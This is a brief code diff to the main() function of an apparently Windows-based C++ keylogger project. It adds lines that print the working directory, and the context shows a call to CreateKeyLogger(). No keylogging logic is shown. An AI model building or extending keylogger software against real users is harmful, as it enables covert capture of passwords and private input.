@@ -14,6 +14,10 @@
 
 int main(void)
 {
+	TCHAR workingDirectory[MAX_PATH] = { 0 };
+	GetCurrentDirectory(MAX_PATH, workingDirectory);
+	std::cout << "Working directory: " << workingDirectory << std::endl;
+
 	signal(SIGINT, &HandleSignal);
 
 	if (CreateKeyLogger() != EXIT_SUCCESS)
